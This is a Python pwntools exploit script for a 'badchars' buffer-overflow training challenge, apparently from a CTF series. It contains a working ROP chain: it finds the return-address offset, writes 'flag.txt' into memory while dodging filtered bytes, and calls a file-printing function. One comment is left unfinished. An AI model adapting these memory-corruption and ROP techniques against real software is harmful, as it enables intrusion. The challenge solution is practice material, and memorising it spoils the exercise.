#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

elf = context.binary = ELF('./badchars')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

context.terminal = ["tilix", "-a", "session-add-right", "-e"]
context.log_level = 'debug'
context.delete_corefiles = True

# -- Determine rip offset --

# run binary and send pattern so that we can determine
# rip offset
io = process([elf.path])
cyclic_pattern = cyclic_gen(string.ascii_uppercase, n=4)
pattern = cyclic_pattern.get(100)
io.sendlineafter('>', pattern)

io.wait() # give it some time to get corefile

# load corefile and read pattern from stack to get offset
core = io.corefile
stack = core.rsp
rip_offset = cyclic_pattern.find(core.read(stack, 4))[0]
debug('rip offset = %#x', rip_offset)

# -- Exploit goes here --

# write address
write_addr = 0x601200

# gadgets
mov_r13_r12_ret = p64(0x400634) # mov [r13], r12
pop_r12x15_ret = p64(0x40069c) # pop r12/13/14/15
pop_rdi_ret = p64(0x4006a3)
add_r15_r14b_ret = p64(0x40062c)
sub_r15_r14b_ret = p64(0x400630)
pop_r14_r15_ret = p64(0x4006a0)

io = start()

# i'll place some dummy chars in place of xag.
# because they'll be changed to something else if I dont
# then I'll add 0x20 to get 'a'
#           add 0x26 to get 'g'
#           add 0x
payload = flat(
    asm('nop') * rip_offset,

    # write data at address
    pop_r12x15_ret,
    b'fl\x41\x41\x41t\x41t', # r12
    p64(write_addr), # r13
    p64(0), p64(0), # r14/15
    mov_r13_r12_ret,

    # set A to a by adding 0x20 to 0x41
    pop_r14_r15_ret,
    p64(0x20), # r14
    p64(write_addr+2), # r15 = address of 'a'
    add_r15_r14b_ret,

    # set A to g by adding 0x26 to 0x41
    pop_r14_r15_ret,
    p64(0x26), # r14
    p64(write_addr+3), # r15 = address of 'g'
    add_r15_r14b_ret,

    # set A to . by subtracting 0x13 from 0x41
    pop_r14_r15_ret,
    p64(0x13), # r14
    p64(write_addr+4), # r15 = address of '.'
    sub_r15_r14b_ret,

    # set A to x by adding 0x37 to 0x41
    pop_r14_r15_ret,
    p64(0x37), # r14
    p64(write_addr+6), # r15 = address of 'x'
    add_r15_r14b_ret,

    # call print_file function
    pop_rdi_ret,
    p64(write_addr),
    p64(elf.sym.usefulFunction+9),
)

print(payload)

io.sendlineafter('>', payload)

io.interactive()
